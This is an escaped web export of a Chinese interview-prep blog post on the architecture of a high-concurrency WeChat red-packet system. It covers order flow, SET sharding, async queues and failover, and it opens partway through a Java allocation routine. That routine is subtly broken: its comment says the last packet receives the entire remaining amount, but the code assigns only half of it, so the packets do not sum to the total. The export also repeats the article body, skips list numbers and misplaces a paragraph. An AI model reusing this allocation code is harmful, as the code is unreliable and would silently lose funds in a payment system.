remainingAmount.subtract(luckValue);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 最后一个红包直接拿走剩余的全部金额，确保总和正确  </span><br><span class=\"line\">        redPacketList.add(remainingAmount.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN));  </span><br><span class=\"line\">  </span><br><span class=\"line\">        return redPacketList;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">        BigDecimal totalAmount = new BigDecimal(&quot;100.00&quot;); // 红包总金额  </span><br><span class=\"line\">        int totalCount = 10;      // 红包个数  </span><br><span class=\"line\">        List&lt;BigDecimal&gt; redPackets = distribute(totalAmount, totalCount);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        System.out.println(&quot;Red packet distribution:&quot;);  </span><br><span class=\"line\">        for (BigDecimal amount : redPackets) &#123;  </span><br><span class=\"line\">            System.out.printf(&quot;%.2f, &quot;, amount);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h2 id=\"红包系统高可用架构设计\"><a href=\"#红包系统高可用架构设计\" class=\"headerlink\" title=\"红包系统高可用架构设计\"></a>红包系统高可用架构设计</h2><p>红包业务量级的高速发展，对后台系统架构的可用性要求越来越高。在保障微信红包业务体验的前提下，红包后台系统进行了一系列高可用方面的优化设计。</p>\n<p>要保障红包系统架构的高可用性，可以从多个方面进行优化和设计。以下是一些详细说明：</p>\n<ol>\n<li><strong>系统架构设计</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>信息流、业务流、资金流分离</strong>：红包系统由信息流、业务流、资金流三部分组成，这三部分在组织架构上应由不同的后台团队完成，以提高系统的模块化和可维护性。</p>\n</li>\n<li><p><strong>微服务架构</strong>：采用微服务架构，将红包系统拆分成多个独立的服务，每个服务负责特定的功能，这样可以提高系统的可扩展性和容错性。</p>\n</li>\n<li><p><strong>无状态设计</strong>：确保红包系统的服务是无状态的，即服务不需要保存用户的会话信息，这样可以提高系统的并发处理能力和可靠性。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li><strong>高可用性策略</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>冗余部署</strong>：将系统的关键组件部署在多台服务器上，通过搭建主备或者集群的架构来实现冗余。当主服务器出现故障时，备用服务器能够自动接管，保证系统的可用性。</p>\n</li>\n<li><p><strong>负载均衡</strong>：通过将流量分发到多台服务器上，均衡系统的请求负载，提高系统的可用性和扩展性。负载均衡可以通过硬件（如负载均衡器）或者软件（如Nginx、HAProxy）实现。</p>\n</li>\n<li><p><strong>服务容器化</strong>：使用容器技术（如Docker、Kubernetes）将应用程序与其依赖项打包为容器，实现快速部署、弹性扩展和自动化管理。容器化可以提高系统的可移植性、弹性和可伸缩性，从而增加系统的高可用性。</p>\n</li>\n</ul>\n<ol start=\"5\">\n<li><strong>数据保障</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>数据备份与恢复</strong>：定期对关键数据进行备份，并确保备份的数据可用性。这样，在发生数据丢失或损坏时，可以快速恢复数据，减少系统停机时间。</p>\n</li>\n<li><p><strong>分布式缓存</strong>：使用多级缓存技术（如Redis、Memcached等），将数据分别存储在内存缓存、本地缓存和分布式缓存中，以提高访问速度和降低数据库压力。</p>\n</li>\n<li><p><strong>数据一致性</strong>：使用分布式锁技术来保护红包的领取操作，确保每个用户只能领取一次红包。同时，为了保证数据一致性，可以采用消息队列等技术实现请求的异步处理和结果的返回。</p>\n</li>\n</ul>\n<ol start=\"7\">\n<li><strong>监控与告警</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>系统监控</strong>：对红包系统的关键指标（如请求量、响应时间、错误率等）进行实时监控，以便及时发现和解决潜在问题。</p>\n</li>\n<li><p><strong>告警机制</strong>：设置合理的告警阈值，当系统出现异常情况时，及时发送告警通知给相关人员，以便快速响应和处理。</p>\n</li>\n</ul>\n<ol start=\"9\">\n<li><p><strong>安全性保障</strong>：</p>\n<p>通过以上措施的综合应用，可以大大提高红包系统架构的高可用性，确保系统在高峰时段能够稳定、高效地运行。</p>\n</li>\n</ol>\n<ul>\n<li><p><strong>访问控制</strong>：实施严格的访问控制策略，确保只有授权的用户才能访问红包系统。</p>\n</li>\n<li><p><strong>数据加密</strong>：对敏感数据进行加密存储和传输，以防止数据泄露和篡改。</p>\n</li>\n<li><p><strong>安全审计</strong>：定期对红包系统进行安全审计和漏洞扫描，及时修复发现的安全漏洞和隐患。</p>\n</li>\n</ul>\n<h4 id=\"1-系统可用性影响因素-1\"><a href=\"#1-系统可用性影响因素-1\" class=\"headerlink\" title=\"1 - 系统可用性影响因素\"></a>1 - 系统可用性影响因素</h4><p><strong>系统的可用性影响因素可分成两类：</strong></p>\n<ul>\n<li><p>一类计划外；</p>\n<p>计划外包含很多因素，系统用到的所有东西都可能产生故障，都可能成功影响可用性的因素。从这个角度上来讲，可以说故障是无法避免的，系统的运作一定会产生故障，尤其是服务器有成千上万个的时候。</p>\n</li>\n<li><p>一类计划内。</p>\n<p>计划内的影响因素，主要有与升级相关、运维相关的操作，以及日常的备份等。这一类影响因素，通过精细地设计方案，是可以避免对可用性造成影响的。</p>\n</li>\n</ul>\n<h4 id=\"2-红包系统可用性设计方向-1\"><a href=\"#2-红包系统可用性设计方向-1\" class=\"headerlink\" title=\"2 - 红包系统可用性设计方向\"></a>2 - 红包系统可用性设计方向</h4><p>基于上面两个分析结论，可以总结出红包系统的可用性的设计方向。</p>\n<blockquote>\n<p>1.在不能避免意外故障的情况下，尽可能降低出现意外故障时对可用性的影响。</p>\n<p>2.绝大多数计划内的日常维护可以通过方案的设计避免影响可用性，其中平行扩容特指关于存储层的平行扩容。</p>\n</blockquote>\n<p>下面从降低故障影响和微信红包系统的平行扩容两方面进行分析。</p>\n<p>首先是降低意外故障的影响，重点讲解订单存储层在订单 DB 故障的情况下如何降低对红包系统可用性的影响。</p>\n<h4 id=\"3-业务逻辑层-部署方案设计-1\"><a href=\"#3-业务逻辑层-部署方案设计-1\" class=\"headerlink\" title=\"3 - 业务逻辑层 - 部署方案设计\"></a>3 - 业务逻辑层 - 部署方案设计</h4><p>首先是业务逻辑层的部署方案。业务逻辑层是无状态的，微信红包系统的业务逻辑层，部署在两个城市，即两地部署，每一个城市部署至少三个园区，即三个 IDC。并且每个服务需要保证三个 IDC 的部署均衡。另外，三个 IDC 总服务能力需要冗余三分之一，当一个 IDC 出现故障时，服务能力仍然足够。从而达到 IDC 故障不会对可用性产生影响。</p>\n<h4 id=\"4-业务逻辑层-异步化设计-1\"><a href=\"#4-业务逻辑层-异步化设计-1\" class=\"headerlink\" title=\"4 - 业务逻辑层 - 异步化设计\"></a>4 - 业务逻辑层 - 异步化设计</h4><p>如下图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。</p>\n<p>比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。</p>\n<p>至于转零钱、写红包记录等操作不需要实时。</p>\n<p>用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。</p>\n<p>所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。</p>\n<p>当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。</p>\n<p>经过上述分析之后，可以采用如下思路与方案：</p>\n<blockquote>\n<p>实现思路：</p>\n<p>1.最简关键路径：简化发红包、拆红包核心流程路径，重点关注与订单相关流程。</p>\n<p>2.快慢分离：将核心流程与其他非关键步骤分离。</p>\n<p>方案：</p>\n<p>1.写用户记录、零钱入账使用MQ异步执行</p>\n<p>2.增加对帐机制保障最终一致。</p>\n</blockquote>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/11.png\"><br>如上图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。</p>\n<p>比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。</p>\n<p>至于转零钱、写红包记录等操作不需要实时。</p>\n<p>用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。</p>\n<p>所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。</p>\n<p>当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h4 id=\"5-订单存储层-故障自愈-1\"><a href=\"#5-订单存储层-故障自愈-1\" class=\"headerlink\" title=\"5 - 订单存储层 - 故障自愈\"></a>5 - 订单存储层 - 故障自愈</h4><p>为解决 DB 间的相互影响，需要将 DB 间相互隔离，订单存储层 SET 化。</p>\n<p>SET 化指订单 DB 和订单接入 SERVER 垂直 stick 一起。业务逻辑层访问订单时，根据订单倒数第二、三位数字找到所属订单 SET，一个 SET 的请求不能路由到其他 SET。</p>\n<p>通过 SET 化得到的好处是，控制 DB 连接数、隔离故障影响和分流并发。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/10.png\"><br>如上图所示，所设尾号 90-99 的 SET 故障时，如果业务逻辑服务后续不再生成属于这个 SET 的订单，那后续的业务就可以逐渐恢复。</p>\n<p>也就是在发生故障时，业务逻辑层发布一个版本，屏蔽故障号段的单号生成，就可以恢复业务。</p>\n<p>进一步想，除了人为发版本，有没有方法可以让 DB 故障时自动恢复？</p>\n<p>在 DB 故障导致业务失败时，业务逻辑层可获取到故障 DB 的号段，在发红包时，将这些故障的号段，换一个可用的号段就可恢复业务。</p>\n<p>订单号除了最后三位，前面的部分已能保证该红包唯一性，后面的数字只代表着分库表信息，故障时只需要将最后三位换另外一个 SET 便可自动恢复。</p>\n<p>完成这个设计后，即使 DB 出现故障，业务的可用性也不会有影响。</p>\n<p>这里还有一点，新的发红包请求可避免 DB 故障的影响，但那些故障之前已发出未被领取的红包，红包消息已发送到微信群，单号已确定，拆红包时还是失败。</p>\n<p>对这种情况，由于不会有增量，采用正常的主备切换解决即可。</p>\n<h4 id=\"6-订单存储层-平行扩容设计-1\"><a href=\"#6-订单存储层-平行扩容设计-1\" class=\"headerlink\" title=\"6 - 订单存储层 - 平行扩容设计\"></a>6 - 订单存储层 - 平行扩容设计</h4><p>红包系统的高可用架构设计，主要包括了部署设计、SET 化设计、异步化设计、DB 故障自愈能力建设、平行扩容设计。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>红包系统是一个高并发的资金交易系统，最大的技术挑战是保障并发性能与资金安全。</p>\n<p>这种全新的技术挑战，传统的“秒杀”系统设计方案已不能完全解决。</p>\n<p>在分析了业界“秒杀”系统解决方案的基础上，红包系统采用了 SET 化、请求排队串行化、双维度分库表等设计，形成了独特的高并发、资金安全系统解决方案。</p>\n<h2 id=\"说在最后：有问题找老架构取经\"><a href=\"#说在最后：有问题找老架构取经\" class=\"headerlink\" title=\"说在最后：有问题找老架构取经\"></a>说在最后：有问题找老架构取经</h2><p>超高并发红包架构，一定是一个超级牛掰的简历亮点项目，黄金项目，稍微晚点把全量的架构方案和视频进行发布。</p>\n<p>这个项目写入简历，面试的时候如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。</p>\n<p>最终，<strong>让面试官爱到 “不能自已、口水直流”</strong>。offer， 也就来了。</p>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<h1 id=\"百亿流量红包系统，如何架构？（字节面试真题）\"><a href=\"#百亿流量红包系统，如何架构？（字节面试真题）\" class=\"headerlink\" title=\"百亿流量红包系统，如何架构？（字节面试真题）\"></a>百亿流量红包系统，如何架构？（字节面试真题）</h1><h2 id=\"说在前面\"><a href=\"#说在前面\" class=\"headerlink\" title=\"说在前面\"></a>说在前面</h2><p>在读者交流群(50+)中，最近有小伙伴拿到了一线互联网企业如得物、阿里、滴滴、极兔、有赞、希音、百度、网易、美团的面试资格，遇到很多很重要的架构类&#x2F;设计类的场景题：</p>\n<blockquote>\n<p>1.如何设计百亿流量高并发红包系统 ，请说出你的方案？</p>\n<p>2.听说你会架构设计，请问一下如果让你来设计百亿流量红包系统，说说你的架构设计方案。</p>\n</blockquote>\n<p>最近有小伙伴在面试字节，又遇到了红包架构问题。小伙伴支支吾吾的说了几句，面试挂了。</p>\n<p>所以，给大家做一下系统化、体系化的梳理，使得大家内力猛增，可以充分展示一下大家雄厚的 “技术肌肉”，<strong>让面试官爱到 “不能自已、口水直流”</strong>，然后实现”offer直提”。</p>\n<h2 id=\"本文目录\"><a href=\"#本文目录\" class=\"headerlink\" title=\"本文目录\"></a>本文目录</h2><p><strong>- 说在前面</strong></p>\n<p><strong>- 本文目录</strong></p>\n<p>- 红包架构背景</p>\n<h5 id=\"红包系统和秒杀系统的对比\"><a href=\"#红包系统和秒杀系统的对比\" class=\"headerlink\" title=\"-红包系统和秒杀系统的对比\"></a>-红包系统和秒杀系统的对比</h5><p><strong>- 红包系统功能分析</strong></p>\n<p>- 功能1：包红包</p>\n<p>- 功能2：发红包</p>\n<p>- 功能3：抢红包</p>\n<p>- 功能4：拆红包</p>\n<h5 id=\"微信红包的业务特点\"><a href=\"#微信红包的业务特点\" class=\"headerlink\" title=\"-微信红包的业务特点\"></a>-微信红包的业务特点</h5><h5 id=\"微信红包的技术难点\"><a href=\"#微信红包的技术难点\" class=\"headerlink\" title=\"-微信红包的技术难点\"></a>-微信红包的技术难点</h5><p>- 红包系统概要设计</p>\n<h5 id=\"系统功能说明\"><a href=\"#系统功能说明\" class=\"headerlink\" title=\"-系统功能说明\"></a>-系统功能说明</h5><p><strong>- 数据库设计</strong></p>\n<h5 id=\"发红包\"><a href=\"#发红包\" class=\"headerlink\" title=\"-发红包\"></a>-发红包</h5><h5 id=\"抢红包\"><a href=\"#抢红包\" class=\"headerlink\" title=\"-抢红包\"></a>-抢红包</h5><p><strong>- 红包系统详细设计</strong></p>\n<p>- 红包整体架构</p>\n<p>- 高并发常用解决方案</p>\n<p>- 1- 使用内存替代实时的DB</p>\n<p>- 2- 使用乐观锁替代悲观锁</p>\n<h5 id=\"JVM-CAS-乐观锁方案\"><a href=\"#JVM-CAS-乐观锁方案\" class=\"headerlink\" title=\"-JVM CAS 乐观锁方案\"></a>-JVM CAS 乐观锁方案</h5><p><strong>- 微信红包系统的高并发解决方案</strong></p>\n<h5 id=\"1-分而治之：系统架构设计垂直Set化。\"><a href=\"#1-分而治之：系统架构设计垂直Set化。\" class=\"headerlink\" title=\"-1- 分而治之：系统架构设计垂直Set化。\"></a>-1- 分而治之：系统架构设计垂直Set化。</h5><h5 id=\"2-解决DB并发：逻辑Server层将请求排队。\"><a href=\"#2-解决DB并发：逻辑Server层将请求排队。\" class=\"headerlink\" title=\"-2- 解决DB并发：逻辑Server层将请求排队。\"></a>-2- 解决DB并发：逻辑Server层将请求排队。</h5><h5 id=\"3-系统性能稳定性保障：双维度分库分表设计。\"><a href=\"#3-系统性能稳定性保障：双维度分库分表设计。\" class=\"headerlink\" title=\"-3- 系统性能稳定性保障：双维度分库分表设计。\"></a>-3- 系统性能稳定性保障：双维度分库分表设计。</h5><h5 id=\"红包分配算法\"><a href=\"#红包分配算法\" class=\"headerlink\" title=\"- 红包分配算法\"></a>- 红包分配算法</h5><h5 id=\"1-实时拆分\"><a href=\"#1-实时拆分\" class=\"headerlink\" title=\"-1- 实时拆分\"></a>-1- 实时拆分</h5><h5 id=\"2-预先生成\"><a href=\"#2-预先生成\" class=\"headerlink\" title=\"-2- 预先生成\"></a>-2- 预先生成</h5><h5 id=\"3-二倍均值法\"><a href=\"#3-二倍均值法\" class=\"headerlink\" title=\"-3- 二倍均值法\"></a>-3- 二倍均值法</h5><p><strong>- 红包系统高可用架构设计</strong></p>\n<h5 id=\"1-系统可用性影响因素\"><a href=\"#1-系统可用性影响因素\" class=\"headerlink\" title=\"-1 - 系统可用性影响因素\"></a>-1 - 系统可用性影响因素</h5><h5 id=\"2-红包系统可用性设计方向\"><a href=\"#2-红包系统可用性设计方向\" class=\"headerlink\" title=\"-2 - 红包系统可用性设计方向\"></a>-2 - 红包系统可用性设计方向</h5><h5 id=\"3-业务逻辑层-部署方案设计\"><a href=\"#3-业务逻辑层-部署方案设计\" class=\"headerlink\" title=\"-3 - 业务逻辑层 - 部署方案设计\"></a>-3 - 业务逻辑层 - 部署方案设计</h5><h5 id=\"4-业务逻辑层-异步化设计\"><a href=\"#4-业务逻辑层-异步化设计\" class=\"headerlink\" title=\"-4 - 业务逻辑层 - 异步化设计\"></a>-4 - 业务逻辑层 - 异步化设计</h5><h5 id=\"5-订单存储层-故障自愈\"><a href=\"#5-订单存储层-故障自愈\" class=\"headerlink\" title=\"-5 - 订单存储层 - 故障自愈\"></a>-5 - 订单存储层 - 故障自愈</h5><h5 id=\"6-订单存储层-平行扩容设计\"><a href=\"#6-订单存储层-平行扩容设计\" class=\"headerlink\" title=\"-6 - 订单存储层 - 平行扩容设计\"></a>-6 - 订单存储层 - 平行扩容设计</h5><p>- 总结</p>\n<h3 id=\"红包架构背景\"><a href=\"#红包架构背景\" class=\"headerlink\" title=\"红包架构背景\"></a>红包架构背景</h3><p>红包是一种 瞬时流量很大的应用， 会在很短的时间内，产生巨大的瞬时流量，</p>\n<p>所以，作为架构师来说，这种场景有很大的架构挑战</p>\n<p>以2017年除夕为例，微信红包峰值QPS在76w左右，除夕当天收发微信红包的数量为142亿个。</p>\n<p>这种百亿级别的数据量、100Wqps级别的超高并发，而且整个系统核心功能和支付相关，需要做好高并发、高可用、高可靠。</p>\n<blockquote>\n<p>特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。</p>\n<p>架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h4 id=\"红包系统和秒杀系统的对比-1\"><a href=\"#红包系统和秒杀系统的对比-1\" class=\"headerlink\" title=\"红包系统和秒杀系统的对比\"></a>红包系统和秒杀系统的对比</h4><p>我们先了解下微信红包支付的流程。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/1.png\"><br>在上面的红包流程中，核心业务包含包红包、发红包、抢红包、拆红包</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/2.png\"><br>其中最关键的步骤是</p>\n<ul>\n<li><p>发红包</p>\n</li>\n<li><p>抢红包。</p>\n</li>\n</ul>\n<p>在整个体系中，红包系统 是 支付系统的商户，红包这个商户出售的是钱。</p>\n<p>所以，用户发红包在红包系统 使用微信支付购买一份 红包商品，红包系统 将钱发放到相对应的微信群，供参与者领取。</p>\n<p>微信群里的用户抢红包，得到的是商品里边的 零钱。</p>\n<p>在整个体系中，红包系统 和支付系统 之间的关系是商家和第三方支付平台的关系。</p>\n<p>红包的流程，很类似 商品“秒杀”活动。</p>\n<ul>\n<li><p>包红包类似秒杀商品管理</p>\n</li>\n<li><p>发红包类似“秒杀”活动的商品上架；</p>\n</li>\n<li><p>抢红包等同于“秒杀”活动中的查询库存；</p>\n</li>\n<li><p>拆红包对应“秒杀”活动中用户的“秒杀”动作。</p>\n</li>\n</ul>\n<p>不过除了上面的相同点之外，红包业务 与 “秒杀”活动相比，还具备自身的特点：</p>\n<p>首先，抢红包 比 “秒杀”有更海量的并发要求。假设同一时间有 10 万个群里的用户同时在发红包，那就相当于同一时间有 10 万个“秒杀”活动发布出去。10 万个微信群里的用户同时抢红包，将产生海量的并发请求。</p>\n<p>其次，微信红包业务要求更严格的安全级别。红包业务本质上是资金交易。资金交易业务比普通商品“秒杀”活动有更高的安全级别要求。</p>\n<ul>\n<li><p><strong>“秒杀”时可以允许存在“超卖”（即实际被抢的商品数量比计划的库存多）、“少卖”（即实际被抢的商户数量比计划的库存少）的情况。</strong></p>\n</li>\n<li><p><strong>但是对于 红包，不允许存在“超卖”、“少卖”。</strong></p>\n</li>\n</ul>\n<blockquote>\n<p>特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。</p>\n<p>架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h2 id=\"红包系统功能分析\"><a href=\"#红包系统功能分析\" class=\"headerlink\" title=\"红包系统功能分析\"></a>红包系统功能分析</h2><p>接下来，40岁老架构带大家，从架构师视角开始红包系统的功能分析。</p>\n<p>微信红包和微信支付之间的交互，与普通商家与微信支付的交互一样，需要经过多个步骤。</p>\n<ul>\n<li><p>用户发红包时，进入微信红包下一笔订单，系统记录发红包用户、发红包金额、红包数量和要发送到的用微信群。</p>\n</li>\n<li><p>然后微信红包系统请求微信支付服务器进行下单，用户使用微信支付进行支付。</p>\n</li>\n<li><p>支付成功后，微信支付后台系统通知微信红包后台系统支付成功结果，微信红包后台系统收到通知后推送微信红包消息到微信群。</p>\n</li>\n<li><p>微信群里用户便可抢红包。</p>\n</li>\n<li><p>用户发现红包还有剩余，就可以拆剩下的红包</p>\n</li>\n</ul>\n<p>这就是微信红包和微信支付的关系以及交互过程。</p>\n<h3 id=\"功能1：包红包\"><a href=\"#功能1：包红包\" class=\"headerlink\" title=\"功能1：包红包\"></a>功能1：包红包</h3><p>系统给每个红包分配一个唯一ID，也就是发红包的订单号，然后将红包发送给用户，红包的个数，红包金额写入到存储。</p>\n<h3 id=\"功能2：发红包\"><a href=\"#功能2：发红包\" class=\"headerlink\" title=\"功能2：发红包\"></a>功能2：发红包</h3><p>用户使用微信支付完成付款，微信红包后台收到微信支付成功的通知。红包系统将红包发送订单状态更新，更新为用户已支付，并写入用户发红包记录表，这样用户可以在钱包中找到用户的发红包流水和收发红包的记录，之后微信红包系统调用微信通知，将微信红包信息发送到微信群。</p>\n<h3 id=\"功能3：抢红包\"><a href=\"#功能3：抢红包\" class=\"headerlink\" title=\"功能3：抢红包\"></a>功能3：抢红包</h3><p>微信群中的用户收到红包消息之后，点开红包，开始抢红包，这个过程微信红包系统会检查红包是否已经被抢完，是否已经过期，是否已经抢过等验证逻辑。</p>\n<h3 id=\"功能4：拆红包\"><a href=\"#功能4：拆红包\" class=\"headerlink\" title=\"功能4：拆红包\"></a>功能4：拆红包</h3><p>拆红包是整个发红包流程最复杂的一个操作，需要查询这个红包的红包订单，判断用户是否可以拆包，计算本次可拆到的红包金额，并记录抢红包流水。</p>\n<p>拆红包包括如下步骤：</p>\n<ul>\n<li><p>1）查询这个红包发送订单，判断用户是否可拆，然后计算本次可拆到的红包金额；</p>\n</li>\n<li><p>2）然后写入一条抢红包记录。如果把拆红包过程，类比为一个秒杀活动的过程，相当于扣库存与写入秒杀记录的过程；</p>\n</li>\n<li><p>3）更新库存对应于更新红包发送订单，写入秒杀记录对应于写入这个红包的领取红包记录；</p>\n</li>\n<li><p>4）另外，还要写入用户整体的红包领取记录；</p>\n</li>\n<li><p>5）最后请求微信支付系统给拆到红包用户转入零钱，成功后更新抢红包的订单状态为已转账成功。</p>\n</li>\n</ul>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/5.png\"></p>\n<p>拆红包过程类似于一个秒杀活动的过程，需要做好库存扣减和秒杀记录的操作。</p>\n<p>更新库存就是更新红包发送的订单，写入秒杀记录就是写入红包领取的信息流水。</p>\n<p>还需要以用户为中心记录用户整体的红包领取记录。</p>\n<p>最后调用支付系统将拆红包后的金额转入用户零钱中，成功之后更新抢红包的订单状态为转账成功。</p>\n<blockquote>\n<p>所以，在看此文之前，最好看看的高并发三部曲的Java高并发核心编程卷3*（注意是最新的清华大学出版社出版的加强版），里边有秒杀架构，可以作为知识铺垫。</p>\n</blockquote>\n<h4 id=\"微信红包的业务特点-1\"><a href=\"#微信红包的业务特点-1\" class=\"headerlink\" title=\"微信红包的业务特点\"></a>微信红包的业务特点</h4><p>微信红包，特别是群红包，业务形态上类似于普通商品的”秒杀”活动。</p>\n<ul>\n<li><p>包红包类似秒杀商品管理</p>\n</li>\n<li><p>发红包类似“秒杀”活动的商品上架；</p>\n</li>\n<li><p>抢红包等同于“秒杀”活动中的查询库存；</p>\n</li>\n<li><p>拆红包对应“秒杀”活动中用户的“秒杀”动作。</p>\n<p>微信红包在业务形态上和普通商品”秒杀”活动相比，还有自身特点：</p>\n</li>\n</ul>\n<ol>\n<li><p><strong>海量并发请求</strong>：微信红包用户在微信群发一个红包，等同于在网上发布一次商品”秒杀”活动，假设同时有10万个群的用户同时发红包，那就相当于同一时间有10万个”秒杀”活动发布。10万个微信群的用户同时抢红包，将产生海量并发请求。</p>\n</li>\n<li><p><strong>更严格的安全级别</strong>：微信红包业务本质上是资金交易，微信红包是微信支付的一个商户，提供资金流转服务，用户发红包相当于在微信红包这个商户上使用微信支付购买了一笔”钱”，且收货地址是微信群。当用户支付成功后，红包”发货”到微信群里，群里的用户拆开红包后，微信红包提供了将”钱”转入拆红包用户微信零钱的服务。</p>\n</li>\n<li><p><strong>订单层南北独立体系</strong>：微信红包系统采用南北独立体系的订单层设计，即数据在南北两个系统中不同步。用户就近接入系统，请求发红包时，系统会根据用户所在地分配订单到南或北的系统，并在订单号上打上南北标识。这种设计有助于分摊流量，降低系统风险。</p>\n</li>\n<li><p><strong>流量闭环</strong>：在抢红包、拆红包、查红包详情列表时，接入层会根据红包单号上的南北标识，将流量分别引导到对应的南北系统闭环。这意味着，无论是发红包还是抢红包，用户都能够在就近的系统中完成操作，无需跨城，提高了系统的响应速度和稳定性。</p>\n</li>\n<li><p><strong>用户数据处理</strong>：微信红包系统的用户数据采取写多读少、全量保存的策略。用户数据的查询入口在微信钱包中，相对隐藏，访问量不会太大，且被视为可旁路的非关键信息，实时性要求不高。这种设计方式可以减少数据存储的压力，提高系统性能。</p>\n</li>\n<li><p><strong>实时计算红包金额</strong>：</p>\n<p>微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值*2之间的数值作为红包金额。</p>\n<p>这种实时计算的方式基于内存进行，不需要额外的存储空间，且计算效率很高。</p>\n<p>同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。</p>\n</li>\n<li><p><strong>架构演进</strong>：随着微信红包功能的不断发展和用户量的增长，其系统架构也经历了不断的演进和优化。从最初的数据库硬抗整个流量，到后来的使用缓存（cache）抗流量，再到现在的南北独立体系等设计，都是为了更好地应对高并发、提升系统性能和稳定性。</p>\n<p>资金交易业务比普通商品”秒杀”有更高的安全级别要求，普通的商品”秒杀”由商户提供，库存是商户预设，”秒杀”允许存在超卖和少卖的情况，但对于微信红包，用户发100元的红包绝对不可以拆出101元，以及只被领取99元时，剩下的1元在24小时过期后要精准退还给发红包用户。</p>\n<p>总的来说，微信红包系统架构的设计充分考虑了用户量、并发量、性能要求等因素，通过南北独立体系、流量闭环、用户数据处理、实时计算红包金额以及架构演进等多种手段，保证了系统的稳定运行和良好用户体验。</p>\n</li>\n</ol>\n<h4 id=\"微信红包的技术难点-1\"><a href=\"#微信红包的技术难点-1\" class=\"headerlink\" title=\"微信红包的技术难点\"></a>微信红包的技术难点</h4><p>微信红包系统架构的技术难点主要体现在以下几个方面：</p>\n<ol>\n<li><p><strong>高并发难点</strong>：</p>\n<p>微信红包在特定时间（如春节、节假日等）会面临极高的并发量，如何有效地处理这些并发请求，保证系统的稳定性和响应速度，是红包系统架构设计的关键挑战之一。</p>\n</li>\n<li><p><strong>资金安全难点</strong>：</p>\n<p>红包系统涉及到资金的转移和存储，因此资金安全是系统设计的重中之重。如何确保资金安全，防止被攻击或篡改，是系统架构设计中需要重点考虑的问题。</p>\n<p>红包业务涉及资金交易，所以一定不能出现超卖、少卖的情况。</p>\n</li>\n</ol>\n<ul>\n<li><p>超卖：发了 10 块钱，结果抢到了 11 块钱，多的钱只能系统补上，如此为爱发电应用估计早就下架了；</p>\n</li>\n<li><p>少卖：发了 10 块钱，只抢了 9 块，多的钱得原封不动地退还用户，否则第二天就接到法院传单了。</p>\n</li>\n</ul>\n<ol start=\"4\">\n<li><p><strong>用户体验难点</strong></p>\n<p>红包系统需要保证良好的用户体验，包括响应速度、公平性（先抢先得）、成功率等。</p>\n<p>如何在高并发场景下保证用户体验，是系统架构设计的重要目标。</p>\n<p>了解下微信红包的用户体验 